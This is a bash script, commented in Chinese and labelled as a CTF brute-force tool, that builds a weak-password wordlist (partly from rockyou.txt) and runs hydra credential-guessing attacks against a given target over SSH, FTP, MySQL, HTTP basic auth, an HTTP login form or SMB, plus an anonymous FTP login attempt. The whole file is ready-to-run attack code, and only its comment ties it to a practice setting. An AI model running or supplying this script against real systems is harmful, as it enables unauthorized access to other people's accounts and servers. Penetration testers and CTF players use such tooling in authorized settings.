#!/bin/bash
# CTF 暴力破解
# 用法: bash brute.sh <TARGET> <SERVICE>

TARGET="${1:?用法: bash brute.sh <TARGET> <SERVICE>}"
SERVICE="${2:-ssh}"

echo "=========================================="
echo "  暴力破解: $TARGET ($SERVICE)"
echo "=========================================="

# 常用弱口令
USERS="admin root test user guest administrator sa postgres oracle mysql ftp web www"
PASSS="admin password 123456 root test guest 1234 123 qwe abc123 admin123 password123 pass123 letmein welcome monkey master dragon"

# 生成字典
TMPDIR=$(mktemp -d)
echo "$USERS" | tr ' ' '\n' > "$TMPDIR/users.txt"
echo "$PASSS" | tr ' ' '\n' > "$TMPDIR/pass.txt"
# 如果有rockyou.txt,合并
[ -f /usr/share/wordlists/rockyou.txt ] && head -1000 /usr/share/wordlists/rockyou.txt >> "$TMPDIR/pass.txt"

case "$SERVICE" in
    ssh)
        echo "[*] SSH暴力破解"
        hydra -L "$TMPDIR/users.txt" -P "$TMPDIR/pass.txt" ssh://"$TARGET" -t 4 -f -V 2>&1 | tail -20
        ;;
    ftp)
        echo "[*] FTP暴力破解"
        hydra -L "$TMPDIR/users.txt" -P "$TMPDIR/pass.txt" ftp://"$TARGET" -t 4 -f -V 2>&1 | tail -20
        # 匿名登录
        echo "[*] FTP匿名登录"
        timeout 5 ftp -inv "$TARGET" << 'EOF' 2>/dev/null
user anonymous anonymous@
ls
quit
EOF
        ;;
    mysql)
        echo "[*] MySQL暴力破解"
        hydra -L "$TMPDIR/users.txt" -P "$TMPDIR/pass.txt" mysql://"$TARGET" -t 4 -f -V 2>&1 | tail -20
        ;;
    http-get)
        echo "[*] HTTP Basic认证爆破"
        hydra -L "$TMPDIR/users.txt" -P "$TMPDIR/pass.txt" "$TARGET" http-get / -t 4 -f -V 2>&1 | tail -20
        ;;
    http-post)
        echo "[*] HTTP表单爆破"
        echo "用法: hydra -l admin -P pass.txt $TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
        hydra -L "$TMPDIR/users.txt" -P "$TMPDIR/pass.txt" "$TARGET" http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 4 -f -V 2>&1 | tail -20
        ;;
    smb)
        echo "[*] SMB暴力破解"
        hydra -L "$TMPDIR/users.txt" -P "$TMPDIR/pass.txt" smb://"$TARGET" -t 4 -f -V 2>&1 | tail -20
        ;;
    *)
        echo "支持的服务: ssh, ftp, mysql, http-get, http-post, smb"
        ;;
esac

rm -rf "$TMPDIR"
echo -e "\n=========================================="
echo "暴力破解完成"
echo "=========================================="
